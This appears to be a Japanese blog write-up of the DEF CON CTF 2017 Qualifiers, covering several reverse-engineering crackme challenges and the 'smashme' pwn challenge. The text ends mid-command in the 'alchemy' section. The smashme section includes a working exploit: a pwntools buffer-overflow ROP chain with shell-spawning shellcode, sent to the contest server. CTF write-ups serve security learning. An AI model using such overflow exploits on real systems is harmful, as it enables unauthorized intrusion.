---
layout: post
title: DEF CON CTF 2017 Qualifiers の write-up
categories: [ctf]
date: 2017-05-02 22:25:00 +0900
---

チーム Bluemermaid で [DEF CON CTF 2017 Qualifiers](https://2017.legitbs.net) に参加しました。最終的にチームで 296 点を獲得し、順位は 80 位 (得点 368 チーム中) でした。うち、私は 7 問を解いて 296 点を入れました。

以下、解いた問題の write-up です。

## Baby's First

### crackme1 (15)

`8a97fb8c264a3b34dad0a707dbfc92832067a0fa0f2b5a576c73557960b11506.tar.bz2` というファイルが与えられました。展開してみましょう。

```
$ tar xvf 8a97fb8c264a3b34dad0a707dbfc92832067a0fa0f2b5a576c73557960b11506.tar.bz2
magic_dist/
magic_dist/4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
$ file magic_dist/4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
magic_dist/4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped
```

実行してみましょう。

```
$ magic_dist/4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
enter code:
hoge
```

コードの入力をするバイナリのようです。objdump で逆アセンブルをしてみると、以下のような処理がありました。

```
$ objdump -M intel -d magic_dist/4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
...
 93b:   48 83 ff 79             cmp    rdi,0x79
 93f:   74 0e                   je     94f <_init+0x257>
 941:   48 83 ec 08             sub    rsp,0x8
 945:   bf 01 00 00 00          mov    edi,0x1
 94a:   e8 09 fe ff ff          call   758 <_init+0x60>
 94f:   b8 a7 00 00 00          mov    eax,0xa7
 954:   c3                      ret
 955:   48 83 ff 65             cmp    rdi,0x65
 959:   74 0e                   je     969 <_init+0x271>
 95b:   48 83 ec 08             sub    rsp,0x8
 95f:   bf 02 00 00 00          mov    edi,0x2
 964:   e8 ef fd ff ff          call   758 <_init+0x60>
 969:   48 c7 c0 9b ff ff ff    mov    rax,0xffffffffffffff9b
 970:   c3                      ret
...
 c6c:   55                      push   rbp
 c6d:   53                      push   rbx
 c6e:   48 89 fd                mov    rbp,rdi
 c71:   48 83 ec 08             sub    rsp,0x8
 c75:   48 0f be 3f             movsx  rdi,BYTE PTR [rdi]
 c79:   e8 bd fc ff ff          call   93b <_init+0x243>
 c7e:   48 0f be 7d 01          movsx  rdi,BYTE PTR [rbp+0x1]
 c83:   48 c1 f8 03             sar    rax,0x3
 c87:   48 89 c3                mov    rbx,rax
 c8a:   e8 c6 fc ff ff          call   955 <_init+0x25d>
 c8f:   48 0f be 7d 02          movsx  rdi,BYTE PTR [rbp+0x2]
 c94:   48 01 c3                add    rbx,rax
 c97:   48 c1 fb 03             sar    rbx,0x3
 c9b:   e8 d1 fc ff ff          call   971 <_init+0x279>
...
```

`cmp    rdi,0x79` `cmp    rdi,0x65` のような部分だけを切り出してみましょう。

```
$ objdump -M intel -d magic_dist/4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652 | grep "cmp    rdi," | awk '{ printf substr($0, length($0)-1) } END { print "" }'
79657320616e64206869732068616e64732073686f6f6b2077697468206578
$ unhex 79657320616e64206869732068616e64732073686f6f6b2077697468206578
yes and his hands shook with ex
```

この文字列を base64 エンコードしてサーバに投げるとフラグが得られました。

```
important videos best playlist Wigeekuk8
```

### smashme (24)

`smashme` というファイルが与えられました。どのようなファイルか調べましょう。

```
$ file ./smashme
./smashme: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=29c2093a0eca94730cd7fd861519602b3272a4f7, not stripped
```

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

実行してみましょう。

```
$ ./smashme
Welcome to the Dr. Phil Show. Wanna smash?
hoge
```

何か入力ができるようです。逆アセンブルしてどのような動作をするか調べましょう。

```
$ gdb ./smashme
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000004009ae <+0>:     push   rbp
   0x00000000004009af <+1>:     mov    rbp,rsp
   0x00000000004009b2 <+4>:     sub    rsp,0x50
   0x00000000004009b6 <+8>:     mov    DWORD PTR [rbp-0x44],edi
   0x00000000004009b9 <+11>:    mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004009bd <+15>:    mov    edi,0x4a06a8 # "Welcome to the Dr. Phil Show. Wanna smash?"
   0x00000000004009c2 <+20>:    call   0x40fca0 <puts>
   0x00000000004009c7 <+25>:    mov    rax,QWORD PTR [rip+0x2c8d7a]        # 0x6c9748 <stdin>
   0x00000000004009ce <+32>:    mov    rdi,rax
   0x00000000004009d1 <+35>:    call   0x40f780 <fflush>
   0x00000000004009d6 <+40>:    lea    rax,[rbp-0x40]
   0x00000000004009da <+44>:    mov    rdi,rax
   0x00000000004009dd <+47>:    mov    eax,0x0
   0x00000000004009e2 <+52>:    call   0x40fad0 <gets>
   0x00000000004009e7 <+57>:    lea    rax,[rbp-0x40]
   0x00000000004009eb <+61>:    mov    esi,0x4a06d8 # "Smash me outside, how bout dAAAAAAAAAAA"
   0x00000000004009f0 <+66>:    mov    rdi,rax
   0x00000000004009f3 <+69>:    call   0x400320
   0x00000000004009f8 <+74>:    test   rax,rax
   0x00000000004009fb <+77>:    je     0x400a04 <main+86>
   0x00000000004009fd <+79>:    mov    eax,0x0
   0x0000000000400a02 <+84>:    jmp    0x400a0e <main+96>
   0x0000000000400a04 <+86>:    mov    edi,0x0
   0x0000000000400a09 <+91>:    call   0x40ea30 <exit>
   0x0000000000400a0e <+96>:    leave  
   0x0000000000400a0f <+97>:    ret    
End of assembler dump.
```

`gets` が使われているので簡単に BOF ができるようです。が、`strstr(ユーザ入力, "Smash me outside, how bout dAAAAAAAAAAA")` の返り値が 0 であれば `exit(0)` が実行されてしまい、せっかくリターンアドレスを書き換えても無意味になってしまいます。

`strstr` は第一引数から第二引数を探し、見つかればその位置のアドレスを、見つからなければ NULL を返します。ということは入力に `Smash me outside, how bout dAAAAAAAAAAA` を含ませればいいはずです。実際にやってみましょう。

```
$ ./smashme
Welcome to the Dr. Phil Show. Wanna smash?
Smash me outside, how bout dAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault
```

セグフォりました。入力のどの位置にリターンアドレスが来るか探してみましょう。

```
gdb-peda$ pattern_create 64
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH'
gdb-peda$ r
Welcome to the Dr. Phil Show. Wanna smash?
Smash me outside, how bout dAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH

Program received signal SIGSEGV, Segmentation fault.
...
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3c8 (")AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0008| 0x7fffffffe3d0 ("A0AAFAAbAA1AAGAAcAA2AAH")
0016| 0x7fffffffe3d8 ("AA1AAGAAcAA2AAH")
0024| 0x7fffffffe3e0 --> 0x48414132414163 ('cAA2AAH')
0032| 0x7fffffffe3e8 --> 0x4009ae (<main>:      push   rbp)
0040| 0x7fffffffe3f0 --> 0x4002c8 (<_init>:     sub    rsp,0x8)
0048| 0x7fffffffe3f8 --> 0xa077efb15fd6e5ef
0056| 0x7fffffffe400 --> 0x401570 (<__libc_csu_init>:   push   r14)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400a0f in main ()
gdb-peda$ pattern_offset ")AAEAAaA"
)AAEAAaA found at offset: 33
```

`Smash me outside, how bout dAAAAAAAAAAA` + 33 文字の位置にリターンアドレスが来るようです。

このバイナリは NX disabled なので、bss セグメントにシェルコードを置いて実行してしまいましょう。

```python
import time
from pwn import *

context(os='linux', arch='amd64')

payload = ''
payload += 'Smash me outside, how bout dAAAAAAAAAAA'
payload += 'A' * (72 - len(payload))

payload += p64(0x4014d6) # pop rdi; ret
payload += p64(0x6cab60) # .bss
payload += p64(0x40fad0) # gets
payload += p64(0x6cab60) # .bss

print payload
time.sleep(.5)
print asm(shellcraft.sh())
```

```
$ (python s.py; cat) | nc smashme_omgbabysfirst.quals.shallweplayaga.me 57348
Welcome to the Dr. Phil Show. Wanna smash?
ls
flag
smashme
cat flag
The flag is: You must be at least this tall to play DEF CON CTF 5b43e02608d66dca6144aaec956ec68d
```

```
You must be at least this tall to play DEF CON CTF 5b43e02608d66dca6144aaec956ec68d
```

## Crackme 2000

### magic (28)

`91ae7f2ec76f00975849c44b3d8ec8ed897fab7335c156d949bd15ea156338b3.tar.bz2` というファイルが与えられました。展開してみましょう。

```
$ tar xf 91ae7f2ec76f00975849c44b3d8ec8ed897fab7335c156d949bd15ea156338b3.tar.bz2
$ ls
91ae7f2ec76f00975849c44b3d8ec8ed897fab7335c156d949bd15ea156338b3.tar.bz2  magic_dist
$ find magic_dist/ -type f | wc -l
200
```

200 個もファイルが出てきてしまいました。この中から適当に 1 個を選んで調べてみましょう。

```
$ file magic_dist/01dd90c3b7d9a36227a5ddc96c7887acbcb973744c1971eaa6da6cccc
6c3e261
magic_dist/01dd90c3b7d9a36227a5ddc96c7887acbcb973744c1971eaa6da6cccc6c3e261: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped
$ magic_dist/01dd90c3b7d9a36227a5ddc96c7887acbcb973744c1971eaa6da6cccc6c3e261
enter code:
hoge
```

crackme1 とよく似ています。objdump で逆アセンブルをしてみると、以下のような処理がありました。

```
$ objdump -M intel -d magic_dist/01dd90c3b7d9a36227a5ddc96c7887acbcb973744c1971eaa6da6cccc6c3e261
...
 93b:   48 83 ff 3d             cmp    rdi,0x3d
 93f:   74 0e                   je     94f <_init+0x257>
 941:   48 83 ec 08             sub    rsp,0x8
 945:   bf 01 00 00 00          mov    edi,0x1
 94a:   e8 09 fe ff ff          call   758 <_init+0x60>
 94f:   b8 16 00 00 00          mov    eax,0x16
 954:   c3                      ret    
 955:   48 83 ff 3d             cmp    rdi,0x3d
 959:   74 0e                   je     969 <_init+0x271>
 95b:   48 83 ec 08             sub    rsp,0x8
 95f:   bf 02 00 00 00          mov    edi,0x2
 964:   e8 ef fd ff ff          call   758 <_init+0x60>
 969:   b8 43 00 00 00          mov    eax,0x43
 96e:   c3                      ret
...
 b61:   55                      push   rbp
 b62:   53                      push   rbx
 b63:   48 89 fd                mov    rbp,rdi
 b66:   48 83 ec 08             sub    rsp,0x8
 b6a:   48 0f be 3f             movsx  rdi,BYTE PTR [rdi]
 b6e:   e8 c8 fd ff ff          call   93b <_init+0x243>
 b73:   48 0f be 7d 01          movsx  rdi,BYTE PTR [rbp+0x1]
 b78:   48 c1 f8 03             sar    rax,0x3
 b7c:   48 89 c3                mov    rbx,rax
 b7f:   e8 d1 fd ff ff          call   955 <_init+0x25d>
 b84:   48 0f be 7d 02          movsx  rdi,BYTE PTR [rbp+0x2]
 b89:   48 01 c3                add    rbx,rax
 b8c:   48 c1 fb 03             sar    rbx,0x3
 b90:   e8 da fd ff ff          call   96f <_init+0x277>
...
```

crackme1 と同じ処理を行っているようです。

サーバに接続するとファイル名が与えられ、そのファイルのコードを答えろと言われます。自動化してしまいましょう。

```python
from subprocess import *
from pwn import *

s = remote('cm2k-magic_b46299df0752c152a8e0c5f0a9e5b8f0.quals.shallweplayaga.me', 12001)
s.recvline()

for _ in range(10):
  t = s.recvline().strip()
  log.info(t)

  p = Popen(r'objdump -M intel -d magic_dist/%s | grep "cmp    rdi,0x"' % t, shell=True, stdout=PIPE, stderr=PIPE)
  o = p.communicate()[0]
  res = ''.join(line[-2:] for line in o.splitlines()).decode('hex')
  log.info(res)

  s.send(res.encode('base64'))

s.interactive()
s.close()
```

```
a color map of the sun sokemsUbif
```

### sorcery (42)

`a22955db696fba1c47031eb87c0d2ba737b7b2861caab2dbc132657e8315a2fb.tar.bz2` というファイルが与えられました。展開してみると 200 個の x86_64 の ELF が出てきました。

どれもコードを入力するバイナリのようで magic とよく似ていますが、コードのチェック処理は全く異なっているようです。調べていると以下のような処理がありました。

```
$ objdump -M intel -d sorcery_dist/0264cf610d20d90ced78d4f1ca621763ea183234c20f12d00fe1171074e71ba3 | grep "cmp    [ca]l,0x"
    36a5:       80 f9 6e                cmp    cl,0x6e
    36bb:       80 f9 69                cmp    cl,0x69
    36d1:       80 f9 63                cmp    cl,0x63
    36e7:       80 f9 20                cmp    cl,0x20
    36fd:       80 f9 46                cmp    cl,0x46
    3713:       80 f9 72                cmp    cl,0x72
    3729:       80 f9 6f                cmp    cl,0x6f
    373f:       80 f9 6e                cmp    cl,0x6e
    3755:       80 f9 74                cmp    cl,0x74
    3767:       3c 69                   cmp    al,0x69
    6dde:       3c e0                   cmp    al,0xe0
    6dfd:       3c f0                   cmp    al,0xf0
    6e6f:       3c bf                   cmp    al,0xbf
    7321:       3c 2e                   cmp    al,0x2e
    73ee:       3c 24                   cmp    al,0x24
    7e5e:       3c 0a                   cmp    al,0xa
    7f21:       3c e0                   cmp    al,0xe0
    7f49:       3c f0                   cmp    al,0xf0
    8d73:       80 f9 80                cmp    cl,0x80
    8d93:       80 f9 f0                cmp    cl,0xf0
...
```

これをコードとして入力してみましょう。

```
$ objdump -M intel -d sorcery_dist/0264cf610d20d90ced78d4f1ca621763ea183234c20f12d00fe1171074e71ba3 | grep "cmp    [ca]l,0x" | awk '{ printf substr($0, length($0)-1) } END { print "" }'
6e69632046726f6e7469e0f0bf2e24xae0f080f0f48080e0edee8011x3x2e0f0x2x1x3x2x1x3x2x1x3x2x4x1x2x37f454c46x1x2x1x2x22f2f2f
$ unhex 6e69632046726f6e7469
nic Fronti
$ sorcery_dist/0264cf610d20d90ced78d4f1ca621763ea183234c20f12d00fe1171074
e71ba3
enter code:
nic Fronti
sum is 23
```

どうやら正解のようです。magic と同様に自動化してしまいましょう。

```python
from subprocess import *
from pwn import *

s = remote('cm2k-sorcery_13de8e6bf26e435fc43efaf46b488eae.quals.shallweplayaga.me', 12002)
s.recvline()

for _ in range(10):
  t = s.recvline().strip()
  log.info(t)

  p = Popen(r'objdump -M intel -d sorcery_dist/%s | grep "cmp    [ca]l,0x"' % t, shell=True, stdout=PIPE, stderr=PIPE)
  o = p.communicate()[0]
  res = ''
  for line in o.splitlines():
    res += line[-2:]
    if 'al' in line:
      break
  res = res.decode('hex')
  log.info(res)

  s.send(res.encode('base64'))

s.interactive()
s.close()
```

```
don't forget me when you're famous Klousovnec
```

### witchcraft (56)

`5b52e6eb4372bb6e2b46888fd2d9e2e50efb2003c41d6ad661e588f9afca5069.tar.bz2` というファイルが与えられました。展開してみると 200 個の x86_64 の ELF が出てきました。

適当に 1 個を選んで逆アセンブルしてみると以下のような処理がありました。

```
$ objdump -M intel -d witchcraft_dist/0a141435fef54ddd64eaaa9862873254c52a94812478095d3ca93ed82bce40d0
...
  4022a0:	55                   	push   rbp
  4022a1:	48 89 e5             	mov    rbp,rsp
  4022a4:	48 85 ff             	test   rdi,rdi
  4022a7:	0f 84 21 01 00 00    	je     4023ce <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x10ee>
  4022ad:	48 83 ef 18          	sub    rdi,0x18
  4022b1:	0f 80 21 01 00 00    	jo     4023d8 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x10f8>
  4022b7:	48 83 c7 19          	add    rdi,0x19
  4022bb:	0f 80 19 01 00 00    	jo     4023da <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x10fa>
  4022c1:	48 83 ef 09          	sub    rdi,0x9
  4022c5:	0f 80 11 01 00 00    	jo     4023dc <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x10fc>
  4022cb:	48 83 c7 12          	add    rdi,0x12
  4022cf:	0f 80 09 01 00 00    	jo     4023de <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x10fe>
  4022d5:	48 83 c7 09          	add    rdi,0x9
  4022d9:	0f 80 01 01 00 00    	jo     4023e0 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1100>
  4022df:	48 83 c7 10          	add    rdi,0x10
  4022e3:	0f 80 f9 00 00 00    	jo     4023e2 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1102>
  4022e9:	48 83 c7 1e          	add    rdi,0x1e
  4022ed:	0f 80 f1 00 00 00    	jo     4023e4 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1104>
  4022f3:	48 83 ef 1c          	sub    rdi,0x1c
  4022f7:	0f 80 e9 00 00 00    	jo     4023e6 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1106>
  4022fd:	48 83 ef 06          	sub    rdi,0x6
  402301:	0f 80 e1 00 00 00    	jo     4023e8 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1108>
  402307:	48 83 ef 14          	sub    rdi,0x14
  40230b:	0f 80 d9 00 00 00    	jo     4023ea <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x110a>
  402311:	48 83 c7 07          	add    rdi,0x7
  402315:	0f 80 d1 00 00 00    	jo     4023ec <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x110c>
  40231b:	48 83 c7 09          	add    rdi,0x9
  40231f:	0f 80 c9 00 00 00    	jo     4023ee <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x110e>
  402325:	48 83 ef 19          	sub    rdi,0x19
  402329:	0f 80 c1 00 00 00    	jo     4023f0 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1110>
  40232f:	48 83 c7 1d          	add    rdi,0x1d
  402333:	0f 80 b9 00 00 00    	jo     4023f2 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1112>
  402339:	48 83 c7 20          	add    rdi,0x20
  40233d:	0f 80 b1 00 00 00    	jo     4023f4 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1114>
  402343:	48 83 c7 0a          	add    rdi,0xa
  402347:	0f 80 a9 00 00 00    	jo     4023f6 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1116>
  40234d:	48 83 ef 06          	sub    rdi,0x6
  402351:	0f 80 a1 00 00 00    	jo     4023f8 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1118>
  402357:	48 83 c7 1a          	add    rdi,0x1a
  40235b:	0f 80 99 00 00 00    	jo     4023fa <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x111a>
  402361:	48 83 c7 19          	add    rdi,0x19
  402365:	0f 80 91 00 00 00    	jo     4023fc <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x111c>
  40236b:	48 83 c7 0b          	add    rdi,0xb
  40236f:	0f 80 89 00 00 00    	jo     4023fe <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x111e>
  402375:	48 83 c7 10          	add    rdi,0x10
  402379:	0f 80 81 00 00 00    	jo     402400 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1120>
  40237f:	48 83 ef 22          	sub    rdi,0x22
  402383:	70 7d                	jo     402402 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1122>
  402385:	48 83 ef 0c          	sub    rdi,0xc
  402389:	70 79                	jo     402404 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1124>
  40238b:	48 83 ef 1d          	sub    rdi,0x1d
  40238f:	70 75                	jo     402406 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1126>
  402391:	48 83 c7 08          	add    rdi,0x8
  402395:	70 71                	jo     402408 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1128>
  402397:	48 83 ef 06          	sub    rdi,0x6
  40239b:	70 6d                	jo     40240a <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x112a>
  40239d:	48 83 ef 20          	sub    rdi,0x20
  4023a1:	70 69                	jo     40240c <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x112c>
  4023a3:	48 83 ef 05          	sub    rdi,0x5
  4023a7:	70 65                	jo     40240e <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x112e>
  4023a9:	48 83 c7 15          	add    rdi,0x15
  4023ad:	70 61                	jo     402410 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1130>
  4023af:	48 83 c7 1a          	add    rdi,0x1a
  4023b3:	70 5d                	jo     402412 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1132>
  4023b5:	48 83 ef 0e          	sub    rdi,0xe
  4023b9:	70 59                	jo     402414 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1134>
  4023bb:	48 83 ef 04          	sub    rdi,0x4
  4023bf:	70 55                	jo     402416 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1136>
  4023c1:	48 83 ff 60          	cmp    rdi,0x60
  4023c5:	75 07                	jne    4023ce <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x10ee>
  4023c7:	b8 60 00 00 00       	mov    eax,0x60
  4023cc:	5d                   	pop    rbp
  4023cd:	c3                   	ret
  4023ce:	bf 02 00 00 00       	mov    edi,0x2
  4023d3:	e8 f8 ee ff ff       	call   4012d0 <exit@plt>
...
  406229:	49 c1 ff 03          	sar    r15,0x3
  40622d:	41 0f b6 7e 21       	movzx  edi,BYTE PTR [r14+0x21]
  406232:	e8 69 c0 ff ff       	call   4022a0 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0xfc0>
  406237:	48 89 c3             	mov    rbx,rax
  40623a:	4c 01 fb             	add    rbx,r15
  40623d:	0f 80 de 05 00 00    	jo     406821 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x5541>
  406243:	48 c1 fb 03          	sar    rbx,0x3
  406247:	4d 8b 66 10          	mov    r12,QWORD PTR [r14+0x10]
  40624b:	41 0f b6 7e 22       	movzx  edi,BYTE PTR [r14+0x22]
  406250:	e8 cb c1 ff ff       	call   402420 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x1140>
  406255:	49 89 c7             	mov    r15,rax
  406258:	49 01 df             	add    r15,rbx
  40625b:	0f 80 c2 05 00 00    	jo     406823 <_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt+0x5543>
...
```

1 文字ごとにチェックする関数が用意され、その関数では引数を足したり引いたりしたあと定数と比較し、同じ場合には `return ...`、違っていれば `exit(...)` されるようです。自動化しましょう。

```python
import re
import struct
from subprocess import *
from pwn import *

_p = re.compile(r'''
\s*[0-9a-f]+:\s*[0-9a-f ]+\s*push\s*rbp
\s*[0-9a-f]+:\s*[0-9a-f ]+\s*mov\s*rbp,rsp
\s*[0-9a-f]+:\s*[0-9a-f ]+\s*test\s*rdi,rdi
\s*[0-9a-f]+:\s*[0-9a-f ]+\s*je\s*[0-9a-f]+\s*<_TTSfq4n_s___TFVs11_StringCore15_encodeSomeUTF8fT4fromSi_TSiVs6UInt64_@plt\+0x[0-9a-f]+>
'''.strip())

def get_code(s):
  res = ''
  for m in _p.finditer(s):
    x = 0
    for line in s[m.end(0):].splitlines()[1::2]:
      n = re.findall(r'(add|sub|cmp)\s*rdi,0x([0-9a-f]+)', line)[0]
      if 'add' == n[0]:
        x += int(n[1], 16)
      elif 'sub' == n[0]:
        x -= int(n[1], 16)
      elif 'cmp' == n[0]:
        y = n[1]
        if y.startswith('ffffffff'):
          y = struct.unpack('>q', y.decode('hex'))[0]
        else:
          y = int(y, 16)
        res += chr(y - x)
        break
  return res

s = remote('cm2k-witchcraft_5f60e994e19a100de1dee736608d639f.quals.shallweplayaga.me', 12003)
s.recvline()

for _ in range(10):
  t = s.recvline().strip()
  log.info(t)

  p = Popen(r'objdump -M intel -d "witchcraft_dist/%s"' % t, shell=True, stdout=PIPE, stderr=PIPE)
  o = p.communicate()[0]
  res = get_code(o)
  log.info(res)

  s.send(res.encode('base64'))

s.interactive()
s.close()
```

```
bustin makes me feel good scengoybEm
```

### alchemy (48)

`ae5b9a51e1d20b010e736c935f96a23ae5115c54824816170d9acb85a8feaeb3.tar.bz2` というファイルが与えられました。展開してみると 200 個の x86_64 の ELF が出てきました。

適当に 1 個を選んで逆アセンブルすると以下のような処理がありました。

```
$ objdump -M intel -d alchemy_dist/024ae029889401df92b0646be0394557b28c602740951e70cdecbc2ea5544f99 | grep "cmp    r[ac]x,0x"
  40d6ac:       48 83 f8 0e             cmp    rax,0xe
  40f1b4:       48 83 f9 62             cmp    rcx,0x62
  40f1cc:       48 83 f9 6f             cmp    rcx,0x6f
  40f1e4:       48 83 f9 6e             cmp    rcx,0x6e
  40f1fc:       48 83 f9 65             cmp    rcx,0x65
  40f214:       48 83 f9 73             cmp    rcx,0x73
  40f22c:       48 83 f9 2c             cmp    rcx,0x2c
  40f244:       48 83 f9 20             cmp    rcx,0x20
  40f25c:       48 83 f9 74             cmp    rcx,0x74
  40f274:       48 83 f9 68             cmp    rcx,0x68
  40f28c:       48 83 f9 65             cmp    rcx,0x65
  40f2a4:       48 83 f9 20             cmp    rcx,0x20
  40f2bc:       48 83 f9 73             cmp    rcx,0x73
  40f2d4:       48 83 f9 77             cmp    rcx,0x77
  40f2ec:       48 83 f9 65             cmp    rcx,0x65
  40f304:       48 83 f9 6c             cmp    rcx,0x6c
  40f31c:       48 83 f9 6c             cmp    rcx,0x6c
  40f334:       48 83 f9 20             cmp    rcx,0x20
  40f34c:       48 83 f9 6f             cmp    rcx,0x6f
  40f364:       48 83 f9 66             cmp    rcx,0x66
  40f37c:       48 83 f9 20             cmp    rcx,0x20
  40f394:       48 83 f9 68             cmp    rcx,0x68
  40f3ac:       48 83 f9 65             cmp    rcx,0x65
  40f3c4:       48 83 f9 72             cmp    rcx,0x72
  40f3dc:       48 83 f9 20             cmp    rcx,0x20
  40f3f4:       48 83 f9 63             cmp    rcx,0x63
  40f40c:       48 83 f9 6c             cmp    rcx,0x6c
  40f424:       48 83 f9 65             cmp    rcx,0x65
  40f43c:       48 83 f9 61             cmp    rcx,0x61
  40f454:       48 83 f9 76             cmp    rcx,0x76
  40f46c:       48 83 f9 61             cmp    rcx,0x61
  40f484:       48 83 f9 67             cmp    rcx,0x67
  40f49c:       48 83 f9 65             cmp    rcx,0x65
  40f4b4:       48 83 f9 20             cmp    rcx,0x20
  40f4cc:       48 83 f9 69             cmp    rcx,0x69
  40f4e4:       48 83 f9 6e             cmp    rcx,0x6e
  40f4fc:       48 83 f9 20             cmp    rcx,0x20
  40f514:       48 83 f9 74             cmp    rcx,0x74
  40f52c:       48 83 f9 68             cmp    rcx,0x68
  40f544:       48 83 f9 65             cmp    rcx,0x65
  40f55c:       48 83 f9 20             cmp    rcx,0x20
  40f574:       48 83 f9 6f             cmp    rcx,0x6f
  40f58c:       48 83 f9 6c             cmp    rcx,0x6c
  40f5a4:       48 83 f9 64             cmp    rcx,0x64
  40f5bc:       48 83 f9 20             cmp    rcx,0x20
  40f5d4:       48 83 f8 76             cmp    rax,0x76
  410170:       48 83 f8 03             cmp    rax,0x3
...
```

これをコードとして入力してみましょう。

```
$ objdump -M intel -d alchemy_dist/024ae029889401df92b0646be0394557b28c602740951e70cdecbc2ea5544f99 | grep "cmp    r[ac]x,0x" | awk '{ printf substr($0, length($0)-1) } END { print "" }'
